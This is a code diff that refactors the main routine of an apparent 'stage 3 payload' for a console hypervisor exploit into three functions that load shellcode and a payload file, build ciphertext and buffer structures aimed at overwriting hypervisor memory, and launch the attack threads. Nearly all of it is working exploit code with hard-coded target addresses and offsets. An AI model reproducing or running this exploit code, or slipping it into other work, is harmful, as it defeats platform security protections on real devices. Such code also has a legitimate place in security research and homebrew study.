@@ -738,62 +738,130 @@ static void CiphertextOverwriteLoop(void *pScratchPtr, CIPHER_TEXT_DATA *pCipher
     }
 }
 
-void __cdecl main()
+/**
+ * @brief Reads all necessary exploit files from the payload drive and allocates memory buffers.
+ *
+ * @param[out] ppCleanUpdateData Pointer to receive the clean update data buffer.
+ * @param[out] pCleanUpdateDataSize Pointer to receive the size of the clean update data.
+ * @param[out] ppShellCodeData Pointer to receive the stage 4 shellcode buffer.
+ * @param[out] pShellCodeDataSize Pointer to receive the size of the stage 4 shellcode.
+ * @param[out] ppUpdateData Pointer to receive the main update data working buffer.
+ * @param[in]  UpdateDataSize The size to allocate for the main update data buffer.
+ * @param[out] ppCipherTextBuffer Pointer to receive the ciphertext data buffer.
+ * @param[out] ppPayload Pointer to receive the XKE payload working buffer.
+ * @param[out] ppPayloadClean Pointer to receive the clean XKE payload buffer.
+ * @param[in]  PayloadDataSize The size to allocate for the XKE payload buffers.
+ * @return true if initialization is successful, false otherwise.
+ */
+bool InitializeExploitData(
+    BYTE** ppCleanUpdateData, DWORD* pCleanUpdateDataSize,
+    BYTE** ppShellCodeData, DWORD* pShellCodeDataSize,
+    BYTE** ppUpdateData, ULONG UpdateDataSize,
+    CIPHER_TEXT_DATA** ppCipherTextBuffer,
+    BYTE** ppPayload, BYTE** ppPayloadClean, ULONG PayloadDataSize
+)
 {
-    ULONG UpdateDataSize = 0x40000 + 0x80000 + 0x10000;
-    ULONG PayloadDataSize = 0x6000;
-
-    BYTE* pCleanUpdateData = NULL;
-    DWORD CleanUpdateDataSize = 0;
-
-    BYTE* pShellCodeData = NULL;
-    DWORD ShellCodeDataSize = 0;
-
-    THREAD_ARGS ThreadArgs = { 0 };
-
-    // Set the LED color so we know the 3rd stage payload started.
-    SetLEDColor(LED_COLOR_RED_1 | LED_COLOR_RED_2 | LED_COLOR_RED_3 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);
-
     // Read the update file.
-    if (ReadUpdateFile(&pCleanUpdateData, &CleanUpdateDataSize) == false)
+    if (ReadUpdateFile(ppCleanUpdateData, pCleanUpdateDataSize) == false)
     {
-        return;
+        return false;
     }
 
     // Read the exploit shell code.
-    if (ReadShellCodeFile(&pShellCodeData, &ShellCodeDataSize) == false)
+    if (ReadShellCodeFile(ppShellCodeData, pShellCodeDataSize) == false)
     {
-        return;
+        return false;
     }
 
-    // Get the full physical address of the shell code buffer.
-    ULONGLONG ShellCodePhys = 0x8000000000000000 | MmGetPhysicalAddress(pShellCodeData);
-
-    // Allocate a 64k block of memory for the update data.
-    BYTE* pUpdateData = (BYTE*)XPhysicalAlloc(UpdateDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
-    if (pUpdateData == NULL)
+    // Allocate and zero pUpdateData
+    *ppUpdateData = (BYTE*)XPhysicalAlloc(UpdateDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
+    if (*ppUpdateData == NULL)
     {
         DbgPrint("Failed to allocate memory for update data\n");
         DbgBreakPoint();
         VdDisplayFatalError(0x12400 | ERR_UPDATE_DATA_OOM);
-        return;
+        return false;
     }
+    memset(*ppUpdateData, 0, UpdateDataSize);
 
-    // Initialize update data.
-    memset(pUpdateData, 0, UpdateDataSize);
-
-    // Allocate some physical memory to store the cipher text we want to write
-    CIPHER_TEXT_DATA* pCipherTextBuffer = (CIPHER_TEXT_DATA*)XPhysicalAlloc(sizeof (CIPHER_TEXT_DATA), MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES);
-    if (pCipherTextBuffer == NULL)
+    // Allocate and zero pCipherTextBuffer
+    *ppCipherTextBuffer = (CIPHER_TEXT_DATA*)XPhysicalAlloc(sizeof (CIPHER_TEXT_DATA), MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES);
+    if (*ppCipherTextBuffer == NULL)
     {
         DbgPrint("Failed to allocate memory for cipher text\n");
         DbgBreakPoint();
         VdDisplayFatalError(0x12400 | ERR_CIPHER_TEXT_BUFFER_OOM);
-        return;
+        return false;
     }
-    // Zero the above memory so that unused slots of the lookup table contain zeros.
-    memset(pCipherTextBuffer, 0, sizeof (CIPHER_TEXT_DATA));
+    memset(*ppCipherTextBuffer, 0, sizeof(CIPHER_TEXT_DATA));
 
+    // Allocate and zero pPayload
+    *ppPayload = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE);
+    if (*ppPayload == NULL)
+    {
+        DbgPrint("Failed to allocate payload memory\n");
+        DbgBreakPoint();
+        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_1);
+        return false;
+    }
+    memset(*ppPayload, 0, PayloadDataSize);
+
+    // Allocate and zero pPayloadClean
+    *ppPayloadClean = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0, PAGE_READWRITE);
+    if (*ppPayloadClean == NULL)
+    {
+        DbgPrint("Failed to allocate clean payload memory\n");
+        DbgBreakPoint();
+        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_2);
+        return false;
+    }
+    memset(*ppPayloadClean, 0, PayloadDataSize);
+
+    // Read the payload file.
+    if (ReadFile(PAYLOAD_DRIVE "\\xke_update.bin", *ppPayloadClean, 0, PayloadDataSize) == false)
+    {
+        DbgPrint("Failed to read XKE payload file\n");
+        DbgBreakPoint();
+        VdDisplayFatalError(0x12400 | ERR_READING_XKE_PAYLOAD_FILE);
+        return false;
+    }
+
+    return true;
+}
+
+/**
+ * @brief Initializes and sets up the various data structures and buffers required for the exploit.
+ *
+ * This function populates the CIPHER_TEXT_DATA, UPDATE_BUFFER_INFO, and THREAD_ARGS structs.
+ * It also calls BuildCipherTextLookupTable to prepare for the attack.
+ *
+ * @param[in]     pCleanUpdateData Pointer to the clean update data buffer.
+ * @param[in]     CleanUpdateDataSize Size of the clean update data.
+ * @param[in]     pShellCodeData Pointer to the stage 4 shellcode buffer.
+ * @param[in]     ShellCodeDataSize Size of the stage 4 shellcode.
+ * @param[in,out] pUpdateData Pointer to the main update data working buffer.
+ * @param[in]     UpdateDataSize Size of the main update data buffer.
+ * @param[in,out] pCipherTextBuffer Pointer to the ciphertext data buffer.
+ * @param[in]     pPayload Pointer to the XKE payload working buffer.
+ * @param[in]     pPayloadClean Pointer to the clean XKE payload buffer.
+ * @param[in]     PayloadDataSize Size of the XKE payload buffers.
+ * @param[in]     ShellCodePhys Physical address of the stage 4 shellcode.
+ * @param[out]    pThreadArgs Pointer to the thread arguments structure to be populated.
+ * @param[out]    ppScratchPtr Pointer to receive the LZX scratch buffer pointer.
+ */
+void SetupExploitBuffers(
+    // Inputs
+    BYTE* pCleanUpdateData, DWORD CleanUpdateDataSize,
+    BYTE* pShellCodeData, DWORD ShellCodeDataSize,
+    BYTE* pUpdateData, ULONG UpdateDataSize,
+    CIPHER_TEXT_DATA* pCipherTextBuffer,
+    BYTE* pPayload, BYTE* pPayloadClean, ULONG PayloadDataSize,
+    ULONGLONG ShellCodePhys,
+    // Outputs
+    THREAD_ARGS* pThreadArgs,
+    BYTE** ppScratchPtr
+)
+{
     // Setup cipher text parameters.
     pCipherTextBuffer->dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
     pCipherTextBuffer->dec_output_buffer = 0x8000010600030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET);
@@ -820,61 +888,42 @@ void __cdecl main()
     pUpdateInfo->Buffer2Offset = CACHE_ALIGN(pUpdateInfo->ScratchBufferOffset + pUpdateInfo->ScratchBufferSize);
     pUpdateInfo->Buffer2Size = 0x10000;
 
-    // Allocate memory for the XKE payload.
-    BYTE* pPayload = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE);
-    if (pPayload == NULL)
-    {
-        DbgPrint("Failed to allocate payload memory\n");
-        DbgBreakPoint();
-        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_1);
-        return;
-    }
-
-    BYTE* pPayloadClean = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0, PAGE_READWRITE);
-    if (pPayloadClean == NULL)
-    {
-        DbgPrint("Failed to allocate clean payload memory\n");
-        DbgBreakPoint();
-        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_2);
-        return;
-    }
-
-    memset(pPayload, 0, PayloadDataSize);
-    memset(pPayloadClean, 0, PayloadDataSize);
-
-    // Read the payload file.
-    if (ReadFile(PAYLOAD_DRIVE "\\xke_update.bin", pPayloadClean, 0, PayloadDataSize) == false)
-    {
-        DbgPrint("Failed to read XKE payload file\n");
-        DbgBreakPoint();
-        VdDisplayFatalError(0x12400 | ERR_READING_XKE_PAYLOAD_FILE);
-        return;
-    }
-
     // Setup thread args.
-    ThreadArgs.UpdateDataPhys = MmGetPhysicalAddress(pUpdateData);
-    ThreadArgs.UpdateDataSize = pUpdateInfo->TotalSize;
-    ThreadArgs.pPayloadClean = pPayloadClean;
-    ThreadArgs.pPayloadBuffer = pPayload;
-    ThreadArgs.PayloadPhys = MmGetPhysicalAddress(pPayload);
-    ThreadArgs.PayloadSize = PayloadDataSize;
-    ThreadArgs.pCompressedDataClean = pCleanUpdateData;
-    ThreadArgs.CompressedDataSize = CleanUpdateDataSize;
-    ThreadArgs.pCompressedDataInBuffer = pUpdateData + pUpdateInfo->UpdateDataOffset;
-    ThreadArgs.pScratchDataInBuffer = pUpdateData + pUpdateInfo->ScratchBufferOffset;
-    ThreadArgs.ScratchDataOffset = pUpdateInfo->ScratchBufferOffset;
-    ThreadArgs.ScratchDataSize = pUpdateInfo->ScratchBufferSize;
+    pThreadArgs->UpdateDataPhys = MmGetPhysicalAddress(pUpdateData);
+    pThreadArgs->UpdateDataSize = pUpdateInfo->TotalSize;
+    pThreadArgs->pPayloadClean = pPayloadClean;
+    pThreadArgs->pPayloadBuffer = pPayload;
+    pThreadArgs->PayloadPhys = MmGetPhysicalAddress(pPayload);
+    pThreadArgs->PayloadSize = PayloadDataSize;
+    pThreadArgs->pCompressedDataClean = pCleanUpdateData;
+    pThreadArgs->CompressedDataSize = CleanUpdateDataSize;
+    pThreadArgs->pCompressedDataInBuffer = pUpdateData + pUpdateInfo->UpdateDataOffset;
+    pThreadArgs->pScratchDataInBuffer = pUpdateData + pUpdateInfo->ScratchBufferOffset;
+    pThreadArgs->ScratchDataOffset = pUpdateInfo->ScratchBufferOffset;
+    pThreadArgs->ScratchDataSize = pUpdateInfo->ScratchBufferSize;
 
-    ThreadArgs.HvCheckAddress = pCipherTextBuffer->dec_output_buffer;
-    ThreadArgs.ShellCodePhysAddress = ShellCodePhys;
+    pThreadArgs->HvCheckAddress = pCipherTextBuffer->dec_output_buffer;
+    pThreadArgs->ShellCodePhysAddress = ShellCodePhys;
 
     // Save the scratch pointer, we can't access pUpdateInfo from here on out because it'll be moved to protected memory by the hv.
-    BYTE* pScratchPtr = pUpdateData + pUpdateInfo->ScratchBufferOffset;
+    *ppScratchPtr = pUpdateData + pUpdateInfo->ScratchBufferOffset;
+    pThreadArgs->pScratchBuffer = *ppScratchPtr;
+}
 
-    ThreadArgs.pScratchBuffer = pScratchPtr;
-
+/**
+ * @brief Creates the worker threads and starts the main exploit attack loops.
+ *
+ * This function creates the payload thread (RunUpdatePayloadThreadProc) and then starts the
+ * ciphertext overwrite loop on the current thread. This function does not return.
+ *
+ * @param pThreadArgs Pointer to the thread arguments structure.
+ * @param pScratchPtr Pointer to the LZX scratch buffer.
+ * @param pCipherTextBuffer Pointer to the ciphertext data structure.
+ */
+void LaunchAttack(THREAD_ARGS* pThreadArgs, BYTE* pScratchPtr, CIPHER_TEXT_DATA* pCipherTextBuffer)
+{
     // Create the worker threads.
-    HANDLE hXKEWorkerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunUpdatePayloadThreadProc, &ThreadArgs, CREATE_SUSPENDED, NULL);
+    HANDLE hXKEWorkerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunUpdatePayloadThreadProc, pThreadArgs, CREATE_SUSPENDED, NULL);
     if (hXKEWorkerThread == NULL)
     {
         DbgPrint("Failed to create worker thread\n");
@@ -889,6 +938,65 @@ void __cdecl main()
 
     // Run ciphertext overwrite loop on HW thread 0.
     CiphertextOverwriteLoop(pScratchPtr, pCipherTextBuffer);
+}
+
+/**
+ * @brief Main entry point for the stage 3 payload.
+ *
+ * This function orchestrates the high-level flow of the exploit:
+ * 1. Initialize: Reads files and allocates memory.
+ * 2. Setup Buffers: Prepares all data structures for the attack.
+ * 3. Launch Attack: Starts the worker threads and attack loops.
+ */
+void __cdecl main()
+{
+    ULONG UpdateDataSize = 0x40000 + 0x80000 + 0x10000;
+    ULONG PayloadDataSize = 0x6000;
+
+    BYTE* pCleanUpdateData = NULL;
+    DWORD CleanUpdateDataSize = 0;
+    BYTE* pShellCodeData = NULL;
+    DWORD ShellCodeDataSize = 0;
+    BYTE* pUpdateData = NULL;
+    CIPHER_TEXT_DATA* pCipherTextBuffer = NULL;
+    BYTE* pPayload = NULL;
+    BYTE* pPayloadClean = NULL;
+
+    THREAD_ARGS ThreadArgs = { 0 };
+
+    // Set the LED color so we know the 3rd stage payload started.
+    SetLEDColor(LED_COLOR_RED_1 | LED_COLOR_RED_2 | LED_COLOR_RED_3 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);
+
+    // Read all exploit files and allocate memory buffers.
+    if (InitializeExploitData(
+            &pCleanUpdateData, &CleanUpdateDataSize,
+            &pShellCodeData, &ShellCodeDataSize,
+            &pUpdateData, UpdateDataSize,
+            &pCipherTextBuffer,
+            &pPayload, &pPayloadClean, PayloadDataSize) == false)
+    {
+        // Errors are handled in InitializeExploitData
+        return;
+    }
+
+    // Get the full physical address of the shell code buffer.
+    ULONGLONG ShellCodePhys = 0x8000000000000000 | MmGetPhysicalAddress(pShellCodeData);
+    BYTE* pScratchPtr = NULL;
+
+    // Setup all the data structures and buffers for the exploit.
+    SetupExploitBuffers(
+        pCleanUpdateData, CleanUpdateDataSize,
+        pShellCodeData, ShellCodeDataSize,
+        pUpdateData, UpdateDataSize,
+        pCipherTextBuffer,
+        pPayload, pPayloadClean, PayloadDataSize,
+        ShellCodePhys,
+        &ThreadArgs,
+        &pScratchPtr
+    );
+
+    // Launch the attack. This function will not return.
+    LaunchAttack(&ThreadArgs, pScratchPtr, pCipherTextBuffer);
 
     // Should never make it here.
     DbgBreakPoint();
